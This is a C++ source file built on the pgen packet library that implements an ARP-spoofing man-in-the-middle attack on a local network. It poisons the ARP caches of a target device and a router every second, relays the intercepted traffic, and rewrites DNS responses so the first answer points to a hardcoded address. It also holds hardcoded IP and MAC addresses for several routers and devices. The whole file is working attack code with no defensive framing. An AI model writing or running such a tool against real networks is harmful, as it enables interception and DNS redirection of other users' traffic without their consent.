#include <stdio.h>
#include <pgen.h>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>


const char* dev = "wlan1";
const char* myip = "192.168.179.8";

struct host{
	char ip[32];
	char mac[32];
};


/* nad11 mobile router */
struct host router = {"192.168.179.1", "a2:12:42:17:d8:8f"};

/* buffalo router */
//struct host router = {"192.168.222.1", "74:03:bd:13:2c:a6"};

/* kaplan router */
//struct host router = {"10.128.4.1", "00:00:0c:07:ac:01"};

/* iphone */
struct host target = {"192.168.179.2", "f0:24:75:bf:8d:bf"};

/* buffalo usb ethernetl */
//struct host target = {"192.168.222.103", "cc:e1:d5:02:ea:71"};

/* mac wlan en0 */
//struct host target = {"192.168.222.106", "10.128.5.85"};
//struct host target = {"192.168.179.5", "80:e6:50:17:18:46"};



pgen_t* handle;
void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
bool other_packet_filter(const u_char* packet, int len);




bool myswitch(const u_char* packet, int len){
	
	// slankdev.net 
	bit8 _s_data[] = {157, 7, 72, 229};

	if(other_packet_filter(packet, len) == false) return true;

	macaddr next_src;
	macaddr next_dst;
	next_src.setmacbydev(dev);
	pgen_ip ip(packet, len);
	
	if(ip.IP.dst == target.ip)	next_dst = target.mac;
	else						next_dst = router.mac;
	ip.ETH.src = next_src;
	ip.ETH.dst = next_dst;

	ip.compile();
	pgen_unknown buf(ip.data, len);

	if(buf.isUDP){
		if(buf.portis(53)){
			pgen_dns dns(ip.data, len);
			if(dns.DNS.flags.qr == 1){
				memcpy(dns.DNS.answer[0].data, _s_data, 4);
				dns.summary();
				
				dns.send_handle(handle);
				return true;
			}
		}
	}

	ip.send_handle(handle);
	return true;
}





int main(int argc, char** argv){
	handle = pgen_open(dev, NULL);
	if(handle == NULL){
		perror("pgen_open");
		return -1;
	}
	std::thread mitm(mitm_attack, target.ip, target.mac, router.ip, router.mac);
	sniff(handle, myswitch);
}



bool other_packet_filter(const u_char* packet, int len){
	ipaddr myip;
	myip.setipbydev(dev);

	pgen_unknown buf(packet, len);
	if(buf.isIP == false)	return false;
	if(buf.ipaddris(myip)) return false;

	return true;	
}



void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;
	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send(dev);
		pack_to_target2.send(dev);
		sleep(1);
	}		
}
